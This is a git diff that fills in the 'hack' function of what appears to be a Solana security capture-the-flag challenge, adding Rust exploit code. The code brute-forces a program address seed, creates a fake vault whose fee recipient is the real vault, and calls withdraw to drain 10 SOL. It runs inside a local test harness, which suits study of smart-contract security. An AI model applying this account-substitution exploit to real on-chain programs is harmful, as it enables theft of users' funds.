@@ -24,7 +24,61 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    /*
+    vault_info {
+        owner: program,
+        data: Vault {
+            creator: initializer,
+            fee: 2.0,
+            fee_recipient: vault_address,
+            seed: 0,
+        }
+    }
+
+    pool_info {
+        owner: program,
+        data: TipPool {
+            withdraw_authority: poor_boi,
+            value: 0,
+            vault: vault_info,
+        }
+    }
+    */
+
+    let (hacker_seed, hacker_vault) = {
+        let mut seed = 100;
+        loop {
+            match Pubkey::create_program_address(&[&[seed]], &challenge.tip_program) {
+                Err(_) => seed += 1,
+                Ok(addr) => break (seed, addr),
+            }
+        }
+    };
+
+    assert_tx_success(env.execute_as_transaction(
+        &[level3::initialize(
+            challenge.tip_program,
+            hacker_vault,
+            challenge.hacker.pubkey(),
+            hacker_seed,
+            2.0,
+            challenge.vault_address,
+        )],
+        &[&challenge.hacker],
+    ));
+
+    assert_tx_success(env.execute_as_transaction(
+        &[level3::withdraw(
+            challenge.tip_program,
+            challenge.vault_address,
+            hacker_vault,
+            challenge.hacker.pubkey(),
+            sol_to_lamports(10.0),
+        )],
+        &[&challenge.hacker],
+    ));
+}
 
 /*
 SETUP CODE BELOW
